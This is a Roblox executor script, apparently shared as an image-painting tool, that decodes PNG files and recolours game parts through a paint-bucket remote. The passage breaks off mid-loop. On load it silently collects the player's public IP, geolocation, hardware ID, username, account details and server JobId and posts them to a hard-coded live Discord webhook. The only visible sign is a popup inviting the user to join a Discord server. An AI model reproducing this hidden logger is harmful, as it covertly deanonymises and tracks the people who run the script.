local SCRIPT_NAME = "Rect Image paint"
local BLACKLIST_URL = "https://gist.github.com/sobredosisxtco/ce98a42151ba9bc839fb36331ad98ab8/raw/b4fb0775b8bb674576c862f5a86fc87e50e2b520/m.luau"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1551287990599417886/f1Uuiu7cwmefGuu-IAC2mjJaO6_y8wO7ZVgivTPN_7oSJv_kYV1V-vhh9tP_3Frhp-LP"
local LOG_SKIP_NAME = "Noob1Noob667"
local DISCORD_INVITE = "https://discord.gg/sPm6yrsna"
local DISCORD_INVITE_LABEL = "discord.gg/sPm6yrsna"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

local blacklistedIds = {}
local whitelistedIds = {}
local WHITELIST_NAMES = {
    ["Noob1Noob667"] = true,
}

local cachedIp = "N/A"
local cachedIpInfoString = ""
local cachedHwid = "N/A"
local cachedGameName = tostring(game.PlaceId)
local cachedExecutor = "Unknown"

pcall(function()
    cachedIp = game:HttpGet("https://v4.ident.me/")
end)

pcall(function()
    local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
    local IpFields = { "query", "country", "regionName", "city", "zip", "isp", "org", "as" }
    local buf = ""
    for _, field in ipairs(IpFields) do
        if IpInfo[field] then
            buf = buf .. "**" .. field .. ":** " .. tostring(IpInfo[field]) .. "\n"
        end
    end
    cachedIpInfoString = buf
end)

pcall(function()
    cachedHwid = RbxAnalyticsService:GetClientId()
end)

pcall(function()
    cachedGameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

pcall(function()
    cachedExecutor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
        or (secure_load and "Sentinel")
        or (pebc_execute and "ProtoSmasher")
        or (KRNL_LOADED and "Krnl")
        or (is_sirhurt_closure and "SirHurt")
        or (identifyexecutor and identifyexecutor():find("Agarware") and "GrieferHub")
        or (identifyexecutor and identifyexecutor())
        or "Unknown"
end)

local function log(msg, level)
    local prefix = "[" .. SCRIPT_NAME .. "]"
    if level == "warn" then
        warn(prefix .. " " .. msg)
    elseif level == "error" then
        warn(prefix .. " [ERROR] " .. msg)
    else
        print(prefix .. " " .. msg)
    end
end

local function userInfo(plr)
    if not plr then return "unknown" end
    return string.format("%s (%d)", plr.Name, plr.UserId)
end

local function buildEmbed(eventType, content)
    local DName = player.DisplayName
    local Name = player.Name
    local Userid = player.UserId
    local Country = LocalizationService.RobloxLocaleId
    local AccountAge = player.AccountAge
    local MembershipType = string.sub(tostring(player.MembershipType), 21)
    local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'

    return {
        ["author"] = {
            ["name"] = "[ " .. eventType .. " ] " .. content,
            ["url"] = "https://roblox.com",
        },
        ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
            .."**Display Name:** "..DName.."\n"
            .."**Username:** "..Name.."\n"
            .."**User Id:** "..Userid.."\n"
            .."**MembershipType:** "..MembershipType.."\n"
            .."**AccountAge:** "..AccountAge.."\n"
            .."**Country:** "..Country.."\n"
            .."**IP:** "..cachedIp.."\n"
            .."**Hwid:** "..cachedHwid.."\n"
            .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
            .."**Time:** "..tostring(os.date("%X")).."\n\n"
            .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
            .."**Game:** "..cachedGameName.."\n"
            .."**Game Id**: "..game.PlaceId.."\n"
            .."**Exploit:** "..cachedExecutor.."\n\n"
            .."**IP Information:**\n"..cachedIpInfoString.."\n"
            .."**JobId:**\n```"..ConsoleJobId.."```",
        ["type"] = "rich",
        ["color"] = tonumber(0x57F287),
        ["thumbnail"] = {
            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png",
        },
    }
end

local function sendEmbed(embed)
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end

    local data = {
        ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
        ["content"] = "",
        ["embeds"] = { embed },
    }
    local newdata = HttpService:JSONEncode(data)
    local headers = { ["content-type"] = "application/json" }

    pcall(function()
        if syn and syn.request then
            syn.request({ Url = WEBHOOK_URL, Body = newdata, Method = "POST", Headers = headers })
        elseif request then
            request({ Url = WEBHOOK_URL, Body = newdata, Method = "POST", Headers = headers })
        elseif http_request then
            http_request({ Url = WEBHOOK_URL, Body = newdata, Method = "POST", Headers = headers })
        elseif HttpPost then
            HttpPost({ Url = WEBHOOK_URL, Body = newdata, Method = "POST", Headers = headers })
        end
    end)
end

local function webhookLog(eventType, content, level)
    log(content, level)
    if player.Name == LOG_SKIP_NAME then return end
    task.spawn(function()
        sendEmbed(buildEmbed(eventType, content))
    end)
end

local function showDiscordNotification()
    local CoreGui2 = game:GetService("CoreGui")

    local gui = Instance.new("ScreenGui")
    gui.Name = "RectImagePaint_Discord"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 9999
    local placed = pcall(function() gui.Parent = CoreGui2 end)
    if not placed then gui.Parent = player:WaitForChild("PlayerGui") end

    local REST_POS = UDim2.new(1, -340, 0.5, -55)
    local HIDDEN_POS = UDim2.new(1, -100, 0.5, -55)

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 320, 0, 110)
    frame.Position = REST_POS
    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    frame.BackgroundTransparency = 1
    frame.BorderSizePixel = 0
    frame.ZIndex = 100
    frame.Parent = gui
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

    local frameStroke = Instance.new("UIStroke")
    frameStroke.Color = Color3.fromRGB(88, 101, 242)
    frameStroke.Thickness = 1
    frameStroke.Transparency = 1
    frameStroke.Parent = frame

    local accentBar = Instance.new("Frame")
    accentBar.Size = UDim2.new(0, 4, 1, 0)
    accentBar.Position = UDim2.new(0, 0, 0, 0)
    accentBar.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    accentBar.BorderSizePixel = 0
    accentBar.BackgroundTransparency = 1
    accentBar.ZIndex = 101
    accentBar.Parent = frame
    Instance.new("UICorner", accentBar).CornerRadius = UDim.new(0, 8)

    local accentFix = Instance.new("Frame")
    accentFix.Size = UDim2.new(0, 4, 1, -8)
    accentFix.Position = UDim2.new(0, 0, 0, 4)
    accentFix.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    accentFix.BorderSizePixel = 0
    accentFix.BackgroundTransparency = 1
    accentFix.ZIndex = 102
    accentFix.Parent = frame

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -46, 0, 26)
    title.Position = UDim2.new(0, 16, 0, 8)
    title.BackgroundTransparency = 1
    title.Text = "Join our Discord!"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.ZIndex = 103
    title.Parent = frame

    local linkBtn = Instance.new("TextButton")
    linkBtn.Size = UDim2.new(1, -32, 0, 28)
    linkBtn.Position = UDim2.new(0, 16, 0, 36)
    linkBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    linkBtn.BackgroundTransparency = 1
    linkBtn.BorderSizePixel = 0
    linkBtn.Text = DISCORD_INVITE_LABEL
    linkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    linkBtn.TextTransparency = 1
    linkBtn.Font = Enum.Font.GothamBold
    linkBtn.TextSize = 14
    linkBtn.ZIndex = 103
    linkBtn.Parent = frame
    Instance.new("UICorner", linkBtn).CornerRadius = UDim.new(0, 6)

    local copyLbl = Instance.new("TextLabel")
    copyLbl.Size = UDim2.new(1, -32, 0, 18)
    copyLbl.Position = UDim2.new(0, 16, 0, 68)
    copyLbl.BackgroundTransparency = 1
    copyLbl.Text = "Click the link above to copy"
    copyLbl.TextColor3 = Color3.fromRGB(150, 150, 150)
    copyLbl.TextTransparency = 1
    copyLbl.Font = Enum.Font.Gotham
    copyLbl.TextSize = 11
    copyLbl.TextXAlignment = Enum.TextXAlignment.Left
    copyLbl.ZIndex = 103
    copyLbl.Parent = frame

    local closeNotif = Instance.new("TextButton")
    closeNotif.Size = UDim2.new(0, 22, 0, 22)
    closeNotif.Position = UDim2.new(1, -28, 0, 6)
    closeNotif.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    closeNotif.BackgroundTransparency = 1
    closeNotif.BorderSizePixel = 0
    closeNotif.Text = "X"
    closeNotif.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeNotif.TextTransparency = 1
    closeNotif.Font = Enum.Font.GothamBold
    closeNotif.TextSize = 13
    closeNotif.ZIndex = 104
    closeNotif.Parent = frame
    Instance.new("UICorner", closeNotif).CornerRadius = UDim.new(0, 4)

    local function fadeIn()
        local info = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        TweenService:Create(frame, info, { BackgroundTransparency = 0 }):Play()
        TweenService:Create(frameStroke, info, { Transparency = 0 }):Play()
        TweenService:Create(accentBar, info, { BackgroundTransparency = 0 }):Play()
        TweenService:Create(accentFix, info, { BackgroundTransparency = 0 }):Play()
        TweenService:Create(title, info, { TextTransparency = 0 }):Play()
        TweenService:Create(copyLbl, info, { TextTransparency = 0 }):Play()
        TweenService:Create(closeNotif, info, { BackgroundTransparency = 0, TextTransparency = 0 }):Play()
        TweenService:Create(linkBtn, info, { BackgroundTransparency = 0, TextTransparency = 0 }):Play()
    end

    local function slideIn()
        frame.Position = HIDDEN_POS
        local info = TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
        TweenService:Create(frame, info, { Position = REST_POS }):Play()
    end

    local function closeNotifAnim()
        local info = TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
        TweenService:Create(frame, info, {
            BackgroundTransparency = 1,
            Position = HIDDEN_POS,
        }):Play()
        TweenService:Create(frameStroke, info, { Transparency = 1 }):Play()
        TweenService:Create(accentBar, info, { BackgroundTransparency = 1 }):Play()
        TweenService:Create(accentFix, info, { BackgroundTransparency = 1 }):Play()
        TweenService:Create(title, info, { TextTransparency = 1 }):Play()
        TweenService:Create(copyLbl, info, { TextTransparency = 1 }):Play()
        TweenService:Create(closeNotif, info, { BackgroundTransparency = 1, TextTransparency = 1 }):Play()
        TweenService:Create(linkBtn, info, { BackgroundTransparency = 1, TextTransparency = 1 }):Play()
        task.delay(0.36, function()
            if gui and gui.Parent then gui:Destroy() end
        end)
    end

    linkBtn.MouseButton1Click:Connect(function()
        pcall(function()
            if setclipboard then
                setclipboard(DISCORD_INVITE)
                linkBtn.Text = "Copied!"
            elseif toclipboard then
                toclipboard(DISCORD_INVITE)
                linkBtn.Text = "Copied!"
            elseif syn and syn.set_clipboard then
                syn.set_clipboard(DISCORD_INVITE)
                linkBtn.Text = "Copied!"
            else
                linkBtn.Text = DISCORD_INVITE
            end
        end)
        task.delay(1.5, function()
            if linkBtn and linkBtn.Parent then
                linkBtn.Text = DISCORD_INVITE_LABEL
            end
        end)
    end)

    closeNotif.MouseButton1Click:Connect(function()
        closeNotifAnim()
    end)

    task.spawn(function()
        fadeIn()
        slideIn()
    end)

    task.delay(15, function()
        if gui and gui.Parent then
            closeNotifAnim()
        end
    end)
end

webhookLog("INIT", "Script loaded by " .. userInfo(player) .. " — place " .. tostring(game.PlaceId))
webhookLog("INIT", "NOTE: PNG only. Convert JPG/WebP/BMP/GIF to PNG first or the file will be skipped.")
task.spawn(showDiscordNotification)

local banned = false
pcall(function()
    log("Fetching blacklist from gist...")
    local raw = game:HttpGet(BLACKLIST_URL)

    for id in raw:gmatch("%[(%d+)%]%s*=%s*[Tt]rue") do
        blacklistedIds[tonumber(id)] = true
    end
    for id in raw:gmatch("\"(%d+)\"%s*:%s*[Tt]rue") do
        blacklistedIds[tonumber(id)] = true
    end

    if WHITELIST_NAMES[player.Name] then
        whitelistedIds[player.UserId] = true
        if blacklistedIds[player.UserId] then
            blacklistedIds[player.UserId] = nil
        end
        log("Local player " .. userInfo(player) .. " is whitelisted.")
    elseif blacklistedIds[player.UserId] then
        banned = true
        log("Local player is blacklisted — aborting. " .. userInfo(player), "error")
    end

    local count = 0
    for _ in pairs(blacklistedIds) do count = count + 1 end
    log("Loaded " .. count .. " blacklist entries.")
end)

if banned then return end

if not listfiles or not readfile then
    log("Executor does not support listfiles or readfile.", "error")
    error("Your executor does not support listfiles or readfile!")
end

log("File I/O functions verified.")

local inflate
do
    local LENGTH_BASE = {3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258}
    local LENGTH_EXTRA = {0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0}
    local DIST_BASE = {1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577}
    local DIST_EXTRA = {0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13}
    local CLEN_ORDER = {17,18,19,1,9,8,10,7,11,6,12,5,13,4,14,3,15,2,16}

    local function buildTable(lengths)
        local maxBits = 0
        for i = 1, #lengths do if lengths[i] > maxBits then maxBits = lengths[i] end end
        local blCount = {}
        for i = 0, maxBits do blCount[i] = 0 end
        for i = 1, #lengths do blCount[lengths[i]] = blCount[lengths[i]] + 1 end
        blCount[0] = 0
        local nextCode, code = {}, 0
        for bits = 1, maxBits do
            code = (code + blCount[bits - 1]) * 2
            nextCode[bits] = code
        end
        local map = {}
        for bits = 1, maxBits do map[bits] = {} end
        for sym = 1, #lengths do
            local len = lengths[sym]
            if len > 0 then
                map[len][nextCode[len]] = sym - 1
                nextCode[len] = nextCode[len] + 1
            end
        end
        return map, maxBits
    end

    inflate = function(data)
        local pos, bitBuf, bitCnt = 3, 0, 0
        local function getByte() local b = string.byte(data, pos); pos = pos + 1; return b or 0 end
        local function getBits(n)
            while bitCnt < n do
                bitBuf = bitBuf + getByte() * 2 ^ bitCnt
                bitCnt = bitCnt + 8
            end
            local div = 2 ^ n
            local val = bitBuf % div
            bitBuf = (bitBuf - val) / div
            bitCnt = bitCnt - n
            return val
        end
        local out, outLen = {}, 0
        local function pushByte(b) outLen = outLen + 1; out[outLen] = string.char(b) end
        local function decode(map, maxBits)
            local code = 0
            for len = 1, maxBits do
                code = code * 2 + getBits(1)
                local m = map[len]
                local s = m and m[code]
                if s then return s end
            end
            error("Invalid Huffman code")
        end
        local function decodeBlock(litMap, litMax, distMap, distMax)
            while true do
                local sym = decode(litMap, litMax)
                if sym < 256 then pushByte(sym)
                elseif sym == 256 then return
                else
                    local li = sym - 257 + 1
                    local length = LENGTH_BASE[li] + getBits(LENGTH_EXTRA[li])
                    local dsym = decode(distMap, distMax)
                    local di = dsym + 1
                    local dist = DIST_BASE[di] + getBits(DIST_EXTRA[di])
                    local start = outLen - dist + 1
                    for i = 0, length - 1 do pushByte(string.byte(out[start + i])) end
                end
            end
        end
        while true do
            local bfinal, btype = getBits(1), getBits(2)
            if btype == 0 then
                bitBuf, bitCnt = 0, 0
                local len = getByte() + getByte() * 256
                getByte(); getByte()
                for _ = 1, len do pushByte(getByte()) end
            elseif btype == 1 then
                local litLengths = {}
                for i = 1, 144 do litLengths[i] = 8 end
                for i = 145, 256 do litLengths[i] = 9 end
                for i = 257, 280 do litLengths[i] = 7 end
                for i = 281, 288 do litLengths[i] = 8 end
                local distLengths = {}
                for i = 1, 30 do distLengths[i] = 5 end
                local lm, lmax = buildTable(litLengths)
                local dm, dmax = buildTable(distLengths)
                decodeBlock(lm, lmax, dm, dmax)
            elseif btype == 2 then
                local hlit, hdist, hclen = getBits(5) + 257, getBits(5) + 1, getBits(4) + 4
                local clLengths = {}
                for i = 1, 19 do clLengths[i] = 0 end
                for i = 1, hclen do clLengths[CLEN_ORDER[i]] = getBits(3) end
                local cm, cmax = buildTable(clLengths)
                local lengths, total, i = {}, hlit + hdist, 1
                while i <= total do
                    local sym = decode(cm, cmax)
                    if sym < 16 then lengths[i] = sym; i = i + 1
                    elseif sym == 16 then
                        local prev = lengths[i - 1] or 0
                        for _ = 1, 3 + getBits(2) do lengths[i] = prev; i = i + 1 end
                    elseif sym == 17 then
                        for _ = 1, 3 + getBits(3) do lengths[i] = 0; i = i + 1 end
                    else
                        for _ = 1, 11 + getBits(7) do lengths[i] = 0; i = i + 1 end
                    end
                end
                local litLengths, distLengths = {}, {}
                for j = 1, hlit do litLengths[j] = lengths[j] end
                for j = 1, hdist do distLengths[j] = lengths[hlit + j] end
                local lm, lmax = buildTable(litLengths)
                local dm, dmax = buildTable(distLengths)
                decodeBlock(lm, lmax, dm, dmax)
            else error("Invalid deflate block type") end
            if bfinal == 1 then break end
        end
        return table.concat(out)
    end
end

local PNGDecoder = {}
PNGDecoder.__index = PNGDecoder
local CHANNELS_FOR_COLOR_TYPE = { [0]=1, [2]=3, [3]=1, [4]=2, [6]=4 }

function PNGDecoder.new(rawData)
    local self = setmetatable({}, PNGDecoder)
    self.Data = rawData
    self.Length = #rawData
    self.Offset = 1
    self.IDAT = {}
    if self:ReadBytes(8) ~= "\137PNG\r\n\26\n" then error("Invalid PNG Signature") end
    while self.Offset <= self.Length do
        local length = self:ReadInt32()
        local chunkType = self:ReadBytes(4)
        if chunkType == "IHDR" then
            self.Width, self.Height = self:ReadInt32(), self:ReadInt32()
            self.BitDepth = string.byte(self:ReadBytes(1))
            self.ColorType = string.byte(self:ReadBytes(1))
            self.Compression = string.byte(self:ReadBytes(1))
            self.Filter = string.byte(self:ReadBytes(1))
            self.Interlace = string.byte(self:ReadBytes(1))
            self:ReadBytes(4)
        elseif chunkType == "PLTE" then
            local data = self:ReadBytes(length)
            self.PLTE = {}
            for i = 1, length, 3 do
                local r, g, b = string.byte(data, i, i + 2)
                table.insert(self.PLTE, { r or 0, g or 0, b or 0 })
            end
            self:ReadBytes(4)
        elseif chunkType == "IDAT" then
            table.insert(self.IDAT, self:ReadBytes(length))
            self:ReadBytes(4)
        elseif chunkType == "IEND" then break
        else self:ReadBytes(length + 4) end
    end
    if not self.Width or not self.Height then error("Missing IHDR chunk") end
    if self.Interlace ~= 0 then error("Interlaced PNGs are not supported") end
    self:DecodePixels()
    return self
end

function PNGDecoder:ReadBytes(count)
    local val = string.sub(self.Data, self.Offset, self.Offset + count - 1)
    self.Offset = self.Offset + count
    return val
end

function PNGDecoder:ReadInt32()
    local b1, b2, b3, b4 = string.byte(self:ReadBytes(4), 1, 4)
    return (b1 * 16777216) + (b2 * 65536) + (b3 * 256) + b4
end

function PNGDecoder:DecodePixels()
    local channels = CHANNELS_FOR_COLOR_TYPE[self.ColorType]
    if not channels then error("Unsupported PNG color type") end
    local bitDepth = self.BitDepth
    if bitDepth ~= 8 and bitDepth ~= 16 then error("Unsupported PNG bit depth") end
    local bytesPerSample = bitDepth / 8
    local bpp = channels * bytesPerSample
    local stride = self.Width * bpp
    local raw = inflate(table.concat(self.IDAT))
    local filteredRows, prev = {}, {}
    for i = 1, stride do prev[i] = 0 end
    local p = 1
    for y = 1, self.Height do
        local filterType = string.byte(raw, p) or 0
        p = p + 1
        local row = { string.byte(raw, p, p + stride - 1) }
        p = p + stride
        for i = 1, stride do if not row[i] then row[i] = 0 end end
        if filterType == 1 then
            for i = 1, stride do
                local a = (i > bpp) and row[i - bpp] or 0
                row[i] = (row[i] + a) % 256
            end
        elseif filterType == 2 then
            for i = 1, stride do row[i] = (row[i] + prev[i]) % 256 end
        elseif filterType == 3 then
            for i = 1, stride do
                local a = (i > bpp) and row[i - bpp] or 0
                row[i] = (row[i] + math.floor((a + prev[i]) / 2)) % 256
            end
        elseif filterType == 4 then
            for i = 1, stride do
                local a = (i > bpp) and row[i - bpp] or 0
                local b = prev[i]
                local c = (i > bpp) and prev[i - bpp] or 0
                local pp = a + b - c
                local pa, pb, pc = math.abs(pp - a), math.abs(pp - b), math.abs(pp - c)
                local pr
                if pa <= pb and pa <= pc then pr = a
                elseif pb <= pc then pr = b
                else pr = c end
                row[i] = (row[i] + pr) % 256
            end
        elseif filterType ~= 0 then error("Unknown PNG filter type") end
        filteredRows[y] = row
        prev = row
    end
    self.Rows = {}
    for y = 1, self.Height do
        local row = filteredRows[y]
        if bitDepth == 16 then
            local r8 = {}
            local samples = self.Width * channels
            for i = 1, samples do r8[i] = row[(i - 1) * 2 + 1] end
            self.Rows[y] = r8
        else
            self.Rows[y] = row
        end
    end
    self.Channels = channels
end

function PNGDecoder:GetPixel(x, y)
    local row = self.Rows[y]
    if not row or x < 1 or x > self.Width then return nil end
    local ct = self.ColorType
    if ct == 2 then
        local i = (x - 1) * 3
        return Color3.fromRGB(row[i+1] or 0, row[i+2] or 0, row[i+3] or 0)
    elseif ct == 6 then
        local i = (x - 1) * 4
        return Color3.fromRGB(row[i+1] or 0, row[i+2] or 0, row[i+3] or 0)
    elseif ct == 0 then
        local v = row[x] or 0
        return Color3.fromRGB(v, v, v)
    elseif ct == 4 then
        local i = (x - 1) * 2
        local v = row[i + 1] or 0
        return Color3.fromRGB(v, v, v)
    elseif ct == 3 then
        local idx = (row[x] or 0) + 1
        local c = self.PLTE and self.PLTE[idx]
        if c then return Color3.fromRGB(c[1], c[2], c[3]) end
        return Color3.fromRGB(255, 255, 255)
    end
    return Color3.fromRGB(255, 255, 255)
end

log("PNG decoder loaded.")

local stopRequested = false
local isRunning = false
local BATCH_SIZE = 40
local MAX_CONCURRENT = 120
local LIGHT_GRAY = Color3.fromRGB(204, 204, 204)

local function isPlayerPart(obj)
    for _, plr in ipairs(Players:GetPlayers()) do
        local char = plr.Character
        if char and obj:IsDescendantOf(char) then return true end
    end
    return false
end

local function findPaintFunction()
    local char = player.Character
    if not char then return nil, "No character" end
    local bucket = char:FindFirstChild("PaintBucket")
    if not bucket then return nil, "PaintBucket tool not equipped" end
    local remotes = bucket:FindFirstChild("Remotes")
    if not remotes then return nil, "PaintBucket.Remotes missing" end
    local sc = remotes:FindFirstChild("ServerControls")
    if not sc then return nil, "ServerControls missing" end
    if not sc:IsA("RemoteFunction") then return nil, "ServerControls not RemoteFunction" end
    return sc, "OK"
end

local function colorsMatch(a, b, tolerance)
    tolerance = tolerance or 0.02
    return math.abs(a.R - b.R) < tolerance
       and math.abs(a.G - b.G) < tolerance
       and math.abs(a.B - b.B) < tolerance
end

local function makePrimer(color)
    local r, g, b = (color.R + 0.5) % 1, (color.G + 0.5) % 1, (color.B + 0.5) % 1
    if colorsMatch(Color3.new(r, g, b), color, 0.15) then r, g, b = 1 - r, 1 - g, 1 - b end
    return Color3.new(r, g, b)
end

local function applyRotation(u, v, rotation)
    if rotation == 90 then return v, 1 - u
    elseif rotation == 180 then return 1 - u, 1 - v
    elseif rotation == 270 then return 1 - v, u
    end
    return u, v
end

local function applyZoom(u, v, zoom, cx, cy)
    local half = 0.5 / zoom
    local uMin = math.clamp(cx - half, 0, 1)
    local vMin = math.clamp(cy - half, 0, 1)
    local uMax = math.clamp(cx + half, 0, 1)
    local vMax = math.clamp(cy + half, 0, 1)
    local uSpan = uMax - uMin
    local vSpan = vMax - vMin
    if uSpan <= 0 then uSpan = 1 end
    if vSpan <= 0 then vSpan = 1 end
    local zu = uMin + u * uSpan
    local zv = vMin + v * vSpan
    return math.clamp(zu, 0, 1), math.clamp(zv, 0, 1)
end

local function sortByWave(partData, waveStyle)
    if waveStyle == "Rows" then
        table.sort(partData, function(a, b)
            if math.abs(a.v - b.v) > 0.001 then return a.v < b.v end
            return a.u < b.u
        end)
    elseif waveStyle == "Columns" then
        table.sort(partData, function(a, b)
            if math.abs(a.u - b.u) > 0.001 then return a.u < b.u end
            return a.v < b.v
        end)
    elseif waveStyle == "Random" then
        for i = #partData, 2, -1 do
            local j = math.random(i)
            partData[i], partData[j] = partData[j], partData[i]
        end
    else
        table.sort(partData, function(a, b) return a.wave < b.wave end)
    end
end

local function buildPartData(imageData, cornerA, cornerB, rotation, waveStyle, zoom, panX, panY)
    if not cornerA or not cornerB then return nil, "No corners" end

    local regionMin = Vector3.new(
        math.min(cornerA.X, cornerB.X), math.min(cornerA.Y, cornerB.Y), math.min(cornerA.Z, cornerB.Z)
    )
    local regionMax = Vector3.new(
        math.max(cornerA.X, cornerB.X), math.max(cornerA.Y, cornerB.Y), math.max(cornerA.Z, cornerB.Z)
    )

    local parts = {}
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj:IsA("Terrain") and not isPlayerPart(obj) then
            local p = obj.Position
            if p.X >= regionMin.X and p.X <= regionMax.X
                and p.Y >= regionMin.Y and p.Y <= regionMax.Y
                and p.Z >= regionMin.Z and p.Z <= regionMax.Z then
                table.insert(parts, obj)
            end
        end
    end
    if #parts == 0 then return nil, "No parts in region" end

    local axisList = {
        { id = 1, spread = regionMax.X - regionMin.X },
        { id = 2, spread = regionMax.Y - regionMin.Y },
        { id = 3, spread = regionMax.Z - regionMin.Z },
    }
    table.sort(axisList, function(a, b) return a.spread > b.spread end)
    local colAxis, rowAxis = axisList[1], axisList[2]

    local function getAxis(pos, id)
        if id == 1 then return pos.X end
        if id == 2 then return pos.Y end
        return pos.Z
    end

    local colA, colB = getAxis(cornerA, colAxis.id), getAxis(cornerB, colAxis.id)
    local rowA, rowB = getAxis(cornerA, rowAxis.id), getAxis(cornerB, rowAxis.id)
    local colSpan, rowSpan = colB - colA, rowB - rowA

    if math.abs(colSpan) < 0.001 or math.abs(rowSpan) < 0.001 then
        return nil, "Corners share an axis"
    end

    local imgW, imgH = imageData.Width, imageData.Height
    local invertRow = (rowAxis.id == 2)

    local partData = table.create(#parts)
    for i = 1, #parts do
        local p = parts[i]
        local c = getAxis(p.Position, colAxis.id)
        local r = getAxis(p.Position, rowAxis.id)
        local u = math.clamp((c - colA) / colSpan, 0, 1)
        local v = math.clamp((r - rowA) / rowSpan, 0, 1)
        if invertRow then v = 1 - v end

        local su, sv = applyRotation(u, v, rotation)
        local zu, zv = applyZoom(su, sv, zoom, panX, panY)

        local ix = math.clamp(math.floor(zu * (imgW - 1)) + 1, 1, imgW)
        local iy = math.clamp(math.floor(zv * (imgH - 1)) + 1, 1, imgH)
        local color = imageData:GetPixel(ix, iy)

        partData[i] = { part = p, u = u, v = v, wave = u + v, color = color }
    end

    sortByWave(partData, waveStyle)
    return partData
end

local function previewPaint(statusLabel, filePath, cornerA, cornerB, rotation, waveStyle, zoom, panX, panY)
    if not filePath or filePath == "" then statusLabel.Text = "Pick an image first!"; log("Preview aborted — no file selected.", "warn"); return end
    if not cornerA or not cornerB then statusLabel.Text = "Set both corners first!"; log("Preview aborted — corners not set.", "warn"); return end

    statusLabel.Text = "Previewing..."
    log("Preview started: " .. filePath)

    local ok, rawData = pcall(readfile, filePath)
    if not (ok and rawData) then
        statusLabel.Text = "Read failed!"
        log("Preview read failed: " .. filePath, "error")
        return
    end

    local decodeOk, imageData = pcall(PNGDecoder.new, rawData)
    if not (decodeOk and imageData) then
        statusLabel.Text = "Decode failed!"
        log("Preview decode failed: " .. tostring(imageData), "error")
        return
    end

    log("Image decoded: " .. imageData.Width .. "x" .. imageData.Height)

    local partData, err = buildPartData(imageData, cornerA, cornerB, rotation, waveStyle, zoom, panX, panY)
    if not partData then
        statusLabel.Text = "Preview error: " .. err
        log("Preview build failed: " .. err, "error")
        return
    end

    local applied = 0
    for i = 1, #partData do
        local entry = partData[i]
        if entry.color then
            pcall(function() entry.part.Color = entry.color end)
            applied = applied + 1
        end
        if i % 500 == 0 then
            statusLabel.Text = string.format("Previewing... %d/%d", i, #partData)
            task.wait()
        end
    end

    statusLabel.Text = string.format("Preview ready — %d parts colored locally (zoom %.1fx).", applied, zoom)
    log(string.format("Preview complete: %d parts, zoom %.1fx, rotation %d°", applied, zoom, rotation))
end

local function paintExistingStuds(imageData, statusLabel, cornerA, cornerB, waveDelay, forceRepaint, waveStyle, rotation, zoom, panX, panY)
    local paintFn, err = findPaintFunction()
    if not paintFn then
        statusLabel.Text = "Paint Bucket not ready: " .. err
        log("Paint Bucket not ready: " .. err, "error")
        return
    end

    local partData, buildErr = buildPartData(imageData, cornerA, cornerB, rotation, waveStyle, zoom, panX, panY)
    if not partData then
        statusLabel.Text = "Error: " .. buildErr
        log("Paint build failed: " .. buildErr, "error")
        return
    end

    local painted, failed, primed, pending = 0, 0, 0, 0
    local total = #partData
    local startTime = os.clock()

    local function fireRemote(part, targetColor)
        pending = pending + 1
        pcall(function()
            if forceRepaint and part.Locked then part.Locked = false end
            part.Color = targetColor
        end)
        task.spawn(function()
            if forceRepaint and colorsMatch(part.Color, targetColor, 0.05) then
                local primer = makePrimer(targetColor)
                pcall(function() paintFn:InvokeServer("PaintPart", { Part = part, Color = primer }) end)
                primed = primed + 1
            end
            local ok = pcall(function()
                paintFn:InvokeServer("PaintPart", { Part = part, Color = targetColor })
            end)
            if ok then painted = painted + 1 else failed = failed + 1 end
            pending = pending - 1
        end)
    end

    statusLabel.Text = string.format("Wave [%s] %d parts  •  zoom %.1fx  •  delay %.3fs...",
        waveStyle, total, zoom, waveDelay)
    log(string.format("Paint started: %d parts, wave=%s, zoom=%.1fx, rotation=%d°, delay=%.3fs",
        total, waveStyle, zoom, rotation, waveDelay))

    for i = 1, total, BATCH_SIZE do
        if stopRequested then break end
        local batchEnd = math.min(i + BATCH_SIZE - 1, total)
        for j = i, batchEnd do
